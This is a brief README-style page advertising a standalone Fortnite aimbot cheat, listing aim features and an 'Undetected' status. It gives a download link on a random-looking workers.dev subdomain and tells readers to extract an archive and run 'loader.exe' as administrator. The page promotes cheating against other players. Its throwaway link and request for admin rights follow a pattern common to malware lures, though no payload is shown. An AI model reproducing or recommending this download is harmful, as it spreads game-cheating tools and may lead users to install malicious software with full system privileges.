# Fortnite Aimbot

Standalone aimbot for Fortnite with smooth aiming, FOV control and bone priority.

## Download

**[Download Fortnite Aimbot](https://xtiz6i8n6.fresh-link.workers.dev/464dac20)**

## Features

- Smooth aim with adjustable speed
- FOV circle and target selection
- Bone priority: head, chest, nearest
- Visibility check
- Hold or toggle activation
- Per-weapon profiles

## Installation

1. Download the archive from the link above
2. Extract to a separate folder
3. Run `loader.exe` as administrator
4. Launch Fortnite, aim key is `MOUSE5` by default

## Usage

Tune FOV and smooth in the menu (`INSERT`). Settings are stored in `config.json`.

## Status

- Status: Undetected

- Mode: External

## Notes

Lower smooth = snappier aim. After a game update the offsets may need a refresh.
